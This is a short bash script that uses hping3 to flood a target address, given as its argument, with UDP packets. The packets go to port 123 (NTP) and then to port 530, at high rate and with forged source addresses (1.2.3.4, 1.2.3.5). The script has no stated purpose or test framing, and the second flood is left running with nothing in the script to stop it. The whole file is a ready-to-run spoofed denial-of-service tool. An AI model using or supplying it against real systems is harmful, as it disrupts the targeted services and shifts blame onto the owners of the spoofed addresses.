#!/bin/bash

if [ $1 ]
	then
	hping3 $1 -p 123 -t 33 -a 1.2.3.4 --udp  --faster -d 200& 
	sleep 100s
	killall hping3
	hping3 $1 -p 530 -t 14 -a 1.2.3.5 --udp  --faster -d 100& 
fi

